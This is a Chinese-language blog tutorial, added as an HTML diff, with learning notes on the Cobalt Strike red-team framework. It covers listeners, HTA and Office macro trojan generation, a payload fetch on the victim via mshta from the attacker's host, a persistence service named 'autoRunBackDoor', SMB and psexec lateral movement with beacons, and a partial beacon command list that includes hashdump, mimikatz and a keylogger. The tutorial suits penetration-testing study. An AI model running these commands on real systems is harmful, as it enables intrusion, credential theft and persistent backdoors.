@@ -1,0 +1,1272 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next mist use-motion" lang="zh-Hans">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+    
+      
+    
+
+    
+  
+
+  
+
+  
+
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Monda:300,300italic,400,400italic,700,700italic|Roboto Slab:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Penertration,">
+
+
+
+
+
+  <link rel="alternate" href="/atom.xml" title="Tyaoo's Blog" type="application/atom+xml">
+
+
+
+
+
+
+<meta name="description" content="基础知识 官方文档：https://www.cobaltstrike.com/aggressor-script/index.html 使用手册翻译版本：https://wbglil.gitbook.io/cobalt-strike/  简介Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，">
+<meta name="keywords" content="Penertration">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Cobalt Strike Learn">
+<meta property="og:url" content="https://tyaoo.github.io/2021/03/10/Cobalt-Strike-Learn/index.html">
+<meta property="og:site_name" content="Tyaoo&#39;s Blog">
+<meta property="og:description" content="基础知识 官方文档：https://www.cobaltstrike.com/aggressor-script/index.html 使用手册翻译版本：https://wbglil.gitbook.io/cobalt-strike/  简介Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100116fe65cc97a7cf8c8db2d3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210510011615ee06389102a6a3844b.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117346ce013397cc996ac02.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117eaf0d6a75ec5d7741815.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001177a10c44edaf6c2ec5aa3.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117685b5e6fc07412238d0c.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001172afe8ea5ed2338dbd04a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171b000eaf2ef852af888a.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117bbd4fc22109d7b7024a0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117f81bb4fe6b34a9fa2ab4.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171bba1026c94edae3471f.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117924d8eb38aea2f236b67.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117370e63f46d8d82e2aeab.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117debdd12b3acdc8770dbf.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210510011742ef27b7bbd481d37ec0.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117ef5c46b99f1c7ec218ef.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171d7669790f5009fb2c74.png">
+<meta property="og:updated_time" content="2021-05-09T17:26:39.005Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Cobalt Strike Learn">
+<meta name="twitter:description" content="基础知识 官方文档：https://www.cobaltstrike.com/aggressor-script/index.html 使用手册翻译版本：https://wbglil.gitbook.io/cobalt-strike/  简介Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100116fe65cc97a7cf8c8db2d3.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Mist',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://tyaoo.github.io/2021/03/10/Cobalt-Strike-Learn/">
+
+
+
+
+
+  <title>Cobalt Strike Learn | Tyaoo's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Tyaoo's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br>
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off" placeholder="搜索..." spellcheck="false" type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://tyaoo.github.io/2021/03/10/Cobalt-Strike-Learn/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Tyaoo">
+      <meta itemprop="description" content>
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tyaoo's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Cobalt Strike Learn</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2021-03-10T01:15:31+08:00">
+                2021-03-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><blockquote>
+<p>官方文档：<a href="https://www.cobaltstrike.com/aggressor-script/index.html" target="_blank" rel="noopener">https://www.cobaltstrike.com/aggressor-script/index.html</a></p>
+<p>使用手册翻译版本：<a href="https://wbglil.gitbook.io/cobalt-strike/" target="_blank" rel="noopener">https://wbglil.gitbook.io/cobalt-strike/</a></p>
+</blockquote>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Cobalt Strike是一款渗透测试神器，常被业界人称为CS神器。Cobalt Strike已经不再使用MSF而是作为单独的平台使用，它分为客户端与服务端，服务端是一个，客户端可以有多个，可被团队进行分布式协团操作。</p>
+<p>Cobalt Strike集成了端口转发、扫描多模式端口Listener、Windows exe程序生成、Windows dll动态链接库生成、java程序生成、office宏代码生成，包括站点克隆获取浏览器的相关信息等。本期“安仔课堂”，ISEC实验室的陈老师带大家实战操作Cobalt Strike神器的使用。</p>
+<h3 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h3><ul>
+<li>agscript拓展应用的脚本</li>
+<li>c2lint 用于检查profile的错误异常</li>
+<li>teamserver服务端程序</li>
+<li>cobaltstrike，cobaltstrike.jar客户端程序(java跨平台)</li>
+<li>logs目录记录与目标主机的相关信息</li>
+<li>update，update.jar用于更新CS</li>
+<li>third-party第三方工具</li>
+</ul>
+<h3 id="启动服务器"><a href="#启动服务器" class="headerlink" title="启动服务器"></a>启动服务器</h3><blockquote>
+<p>若想修改teamserver端口则直接打开teamserver文件修改<code>-Dcobaltstrike.server_port</code>，端口默认为50050</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ./teamserver &lt;host&gt; &lt;password&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="启动客户端"><a href="#启动客户端" class="headerlink" title="启动客户端"></a>启动客户端</h3><p>Windows下直接打开<code>cobaltstrike.bat</code>文件，填入teamserver的主机，端口和密码，用户名自定义</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100116fe65cc97a7cf8c8db2d3.png" alt="image-20210402003746691" style="zoom: 67%;">
+
+<h3 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/names</span><br></pre></td></tr></table></figure>
+
+<h3 id="用户通信"><a href="#用户通信" class="headerlink" title="用户通信"></a>用户通信</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/msg &lt;username&gt; &lt;message&gt;</span><br></pre></td></tr></table></figure>
+
+<h2 id="Listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h2><ul>
+<li>Beacon DNS</li>
+<li>Beacon HTTP</li>
+<li>Beacon HTTPS</li>
+<li>Beacon SMB</li>
+<li>Beacon TCP</li>
+<li>External C2</li>
+<li>Foreign HTTP</li>
+<li>Foreign HTTPS</li>
+</ul>
+<blockquote>
+<p>Beacon为内置的Listener，即在目标主机执行相应的payload，获取shell到CS上，其中包含DNS、HTTP、SMB</p>
+<p>Foreign为外部结合的Listener，常用于MSF的结合，一般用来派生会话到MSF</p>
+</blockquote>
+<h2 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h2><h3 id="生成hta"><a href="#生成hta" class="headerlink" title="生成hta"></a>生成hta</h3><blockquote>
+<p>HTA是HTML Application的缩写（HTML应用程序），是软件开发的新概念，直接将HTML保存成HTA的格式，就是一个独立的应用软件，与VB、C++等程序语言所设计的软件界面没什么差别。HTML Application有三种类型的生成方式，测试发现，只有powershell方式生成的hta文件才能正常执行上线，Executable和VBA方式生成的hta文件执行的时候提示当前页面的脚本发生错误。</p>
+</blockquote>
+<p>攻击=&gt;生成木马=&gt;Hta程序</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210510011615ee06389102a6a3844b.png" alt="image-20210402010123793" style="zoom: 67%;">
+
+<p>选择刚刚创建的监听器，方法有3种，这里选择PowerShell</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117346ce013397cc996ac02.png" alt="image-20210402010225346" style="zoom:67%;">
+
+<p>利用web服务在受害者机器上下载恶意文件</p>
+<p>攻击=&gt;钓鱼攻击=&gt;文件下载</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117eaf0d6a75ec5d7741815.png" alt="image-20210402010419802" style="zoom:67%;">
+
+<p>选择刚刚生成的hta程序</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001177a10c44edaf6c2ec5aa3.png" alt="image-20210402010541043" style="zoom:67%;">
+
+<p>事件会被记录</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117685b5e6fc07412238d0c.png" alt="image-20210402010734975" style="zoom: 67%;">
+
+<p>在受害者机器上运行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta http://&lt;host&gt;:80/download/file.ext</span><br></pre></td></tr></table></figure>
+
+<h3 id="生成office宏"><a href="#生成office宏" class="headerlink" title="生成office宏"></a>生成office宏</h3><p>攻击=&gt;生成木马=&gt;Office宏木马</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001172afe8ea5ed2338dbd04a.png" alt="image-20210402011728626" style="zoom:67%;">
+
+<p>选择创建的监听器，弹出使用教程</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171b000eaf2ef852af888a.png" alt="image-20210402011835331" style="zoom:67%;">
+
+<blockquote>
+<p>word开启禁用宏：文件——&gt;选项——&gt;信任中心——&gt;信任中心设置</p>
+</blockquote>
+<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>攻击=&gt;生成木马=&gt;生成Payload</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117bbd4fc22109d7b7024a0.png" alt="image-20210402011942160" style="zoom:67%;">
+
+<p>可以选择各种语言的payload，还能勾选是否为64位程序</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117f81bb4fe6b34a9fa2ab4.png" alt="image-20210402012020619" style="zoom:67%;">
+
+<h3 id="生成分阶段木马"><a href="#生成分阶段木马" class="headerlink" title="生成分阶段木马"></a>生成分阶段木马</h3><blockquote>
+<p>Stager是分阶段传送Payload。分阶段的意思是我们生成的Stager马其实是一个小程序，用于从服务器端下载我们真正的shellcode。分阶段在很多时候是很有必要的，因为很多场景对于能加载进内存并成功漏洞利用后执行的数据大小存在严格限制。所以这种时候，我们就不得不利用分阶段传送了。如果不需要分阶段的话，可以在C2的扩展文件里面把host_stage选项设置为false。</p>
+</blockquote>
+<p>攻击=&gt;生成木马=&gt;Windows分阶段木马</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171bba1026c94edae3471f.png" alt="image-20210402012449241" style="zoom:67%;">
+
+<h3 id="生成无阶段木马"><a href="#生成无阶段木马" class="headerlink" title="生成无阶段木马"></a>生成无阶段木马</h3><blockquote>
+<p>Stageless是完整的木马，后续不需要再向服务器端请求shellcode。所以使用这种方法生成的木马会比Stager生成的木马体积要大。但是这种木马有助于避免反溯源，因为如果开启了分阶段传送，任何人都能连接到你的C2服务器请求payload，并分析payload中的配置信息。在CobaltStrike4.0及以后的版本中，后渗透和横向移动绝大部分是使用的Stageless类型的木马。</p>
+<p>Windows Executable(S)相比于Windows Executable，其中包含Beacon的完整payload，不需要阶段性的请求，该模块额外提供了代理设置，以便在较为苛刻的环境中进行渗透测试。该模块还支持powershell脚本，可用于将Stageless Payload注入内存。</p>
+</blockquote>
+<p>攻击=&gt;生成木马=&gt;Windows无阶段木马</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117924d8eb38aea2f236b67.png" alt="image-20210402012506006" style="zoom:67%;">
+
+<blockquote>
+<p>注意，生成的Windows Service EXE生成的木马，直接双击是不会返回session的。需要以创建服务的方式启动，才会返回session。</p>
+<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&gt; #注意，等号（=）后面要有空格</span><br><span class="line">&gt; sc create autoRunBackDoor binPath= "<span class="built_in">cmd</span>.exe /c C:\users\administrator\desktop\cs.exe" <span class="built_in">start</span>=auto DisplayName=autoRunBackDoor</span><br><span class="line">&gt; #开启某个系统服务</span><br><span class="line">&gt; sc <span class="built_in">start</span> autoRunBackDoor </span><br><span class="line">&gt; #停止某个系统服务</span><br><span class="line">&gt; sc stop autoRunBackDoor </span><br><span class="line">&gt; # 删除某个系统服务</span><br><span class="line">&gt; sc delete service_name</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<h2 id="主机深入"><a href="#主机深入" class="headerlink" title="主机深入"></a>主机深入</h2><h3 id="Bypass-UAC提权"><a href="#Bypass-UAC提权" class="headerlink" title="Bypass UAC提权"></a>Bypass UAC提权</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117370e63f46d8d82e2aeab.png" alt="image-20210402012958946" style="zoom:67%;">
+
+<h3 id="hashdump"><a href="#hashdump" class="headerlink" title="hashdump"></a>hashdump</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117debdd12b3acdc8770dbf.png" alt="image-20210402013043844" style="zoom:67%;">
+
+<h3 id="Mimikatz获取密码"><a href="#Mimikatz获取密码" class="headerlink" title="Mimikatz获取密码"></a>Mimikatz获取密码</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/20210510011742ef27b7bbd481d37ec0.png" alt="image-20210402013104992" style="zoom:67%;">
+
+<h2 id="联动MSF"><a href="#联动MSF" class="headerlink" title="联动MSF"></a>联动MSF</h2><p>创建Foreign HTTP监听器</p>
+<p>MSF使用multi/handler进行监听</p>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202105100117ef5c46b99f1c7ec218ef.png" alt="image-20210402013643568" style="zoom:67%;">
+
+<h3 id="共享服务横向移动"><a href="#共享服务横向移动" class="headerlink" title="共享服务横向移动"></a>共享服务横向移动</h3><p>IPC测试</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell dir \\172.16.35.128\C$</span><br></pre></td></tr></table></figure>
+
+<p>创建SMB Beacon</p>
+<p>生成services.exe的Windws无阶段木马</p>
+<p>上传到beacon</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upload /root/Desktop/beacon.exe</span><br></pre></td></tr></table></figure>
+
+<p>复制beacon到内网机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell copy beacon.exe \\172.16.35.128\C$\windows\temp</span><br></pre></td></tr></table></figure>
+
+<p>创建beacon服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc \\172.16.35.128 creat beacon binpath=c:\windows\temp\beacon.exe</span><br></pre></td></tr></table></figure>
+
+<p>启动beacon服务</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell sc \\172.16.35.128 start beacon</span><br></pre></td></tr></table></figure>
+
+<p>连接内网机器</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">link 172.16.35.128</span><br></pre></td></tr></table></figure>
+
+<h3 id="psexec横向移动"><a href="#psexec横向移动" class="headerlink" title="psexec横向移动"></a>psexec横向移动</h3><blockquote>
+<p>如果内网主机无法访问外网</p>
+</blockquote>
+<p>派生一个Foreign Beacon</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">spawn foreign tcp</span><br></pre></td></tr></table></figure>
+
+<p>远程执行beacon</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec 172.16.35.128 C$ beacon smb</span><br></pre></td></tr></table></figure>
+
+<h2 id="脚本管理器"><a href="#脚本管理器" class="headerlink" title="脚本管理器"></a>脚本管理器</h2><p>直接导入cna文件即可</p>
+<h2 id="socks4a代理"><a href="#socks4a代理" class="headerlink" title="socks4a代理"></a>socks4a代理</h2><p>点击SOCKS Server，然后在代理攻击上使用SOCKS4，填上主机和端口即可</p>
+<img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/2021051001171d7669790f5009fb2c74.png" alt="image-20210402015236996" style="zoom:67%;">
+
+<p>停止SOCKS Server</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socks stop</span><br></pre></td></tr></table></figure>
+
+<h2 id="CobaltStrike常见命令"><a href="#CobaltStrike常见命令" class="headerlink" title="CobaltStrike常见命令"></a>CobaltStrike常见命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">BeaconCommands</span><br><span class="line">===============</span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    browserpivot              注入受害者浏览器进程</span><br><span class="line">    bypassuac                 绕过UAC</span><br><span class="line">    cancel                    取消正在进行的下载</span><br><span class="line">    cd                        切换目录</span><br><span class="line">    checkin                   强制让被控端回连一次</span><br><span class="line">    clear                     清除beacon内部的任务队列</span><br><span class="line">    connect                   Connect to a Beacon peerover TCP</span><br><span class="line">    covertvpn                 部署Covert VPN客户端</span><br><span class="line">    cp                        复制文件</span><br><span class="line">    dcsync                    从DC中提取密码哈希</span><br><span class="line">    desktop                   远程VNC</span><br><span class="line">    dllinject                 反射DLL注入进程</span><br><span class="line">    dllload                   使用LoadLibrary将DLL加载到进程中</span><br><span class="line">    download                  下载文件</span><br><span class="line">    downloads                 列出正在进行的文件下载</span><br><span class="line">    drives                    列出目标盘符</span><br><span class="line">    elevate                   尝试提权</span><br><span class="line">   execute                   在目标上执行程序(无输出)</span><br><span class="line">    execute-assembly          在目标上内存中执行本地.NET程序</span><br><span class="line">    exit                      退出beacon</span><br><span class="line">    getprivs                  Enable system privileges oncurrent token</span><br><span class="line">    getsystem                 尝试获取SYSTEM权限</span><br><span class="line">    getuid                    获取用户ID</span><br><span class="line">    hashdump                  转储密码哈希值</span><br><span class="line">    help                      帮助</span><br><span class="line">    inject                    在特定进程中生成会话</span><br><span class="line">    jobkill                   杀死一个后台任务</span><br><span class="line">    jobs                      列出后台任务</span><br><span class="line">    kerberos_ccache_use       从ccache文件中导入票据应用于此会话</span><br><span class="line">    kerberos_ticket_purge     清除当前会话的票据</span><br><span class="line">    kerberos_ticket_use       从ticket文件中导入票据应用于此会话</span><br><span class="line">    keylogger                 键盘记录</span><br><span class="line">    kill                      结束进程</span><br><span class="line">    link                      Connect to a Beacon peerover a named pipe</span><br><span class="line">    logonpasswords            使用mimikatz转储凭据和哈希值</span><br><span class="line">    ls                        列出文件</span><br><span class="line">    make_token                创建令牌以传递凭据</span><br><span class="line">    mimikatz                  运行mimikatz</span><br><span class="line">    mkdir                     创建一个目录</span><br><span class="line">    mode dns                  使用DNS A作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode dns-txt              使用DNS TXT作为通信通道(仅限D beacon)</span><br><span class="line">    mode dns6                 使用DNS AAAA作为通信通道(仅限DNS beacon)</span><br><span class="line">    mode http                 使用HTTP作为通信通道</span><br><span class="line">    mv                        移动文件</span><br><span class="line">    net                       net命令</span><br><span class="line">    note                      备注      </span><br><span class="line">    portscan                  